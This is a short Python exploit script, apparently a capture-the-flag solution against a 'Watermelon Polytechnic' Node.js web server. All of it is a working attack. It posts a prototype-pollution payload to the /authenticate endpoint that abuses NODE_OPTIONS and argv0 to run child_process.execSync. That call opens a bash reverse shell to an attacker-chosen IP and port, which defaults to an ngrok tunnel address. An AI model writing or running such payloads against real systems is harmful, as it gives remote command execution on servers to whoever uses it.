import requests
import os
import argparse

def main(url, ip, port):
    payload = {
        "username": "",
        "password": "",
        "__proto__": {
            "NODE_OPTIONS": "--require /proc/self/cmdline",
            "argv0": f"console.log(require(\"child_process\") \
                .execSync(\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\", \
                {{ shell: \"/bin/bash\" }}).toString())//"
        }
    }

    requests.post(url + "/authenticate", json=payload, verify=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for Watermelon Polytechnic's webserver")
    parser.add_argument("-u", "--url", help="Target URL", default="http://127.0.0.1:3000")
    parser.add_argument("-i", "--ip", help="Reverse shell IP", default=os.popen("dig +short 0.tcp.ap.ngrok.io").read().strip())
    parser.add_argument("-p", "--port", help="Reverse shell port", required=True)
    args = parser.parse_args()

    main(args.url, args.ip, args.port)
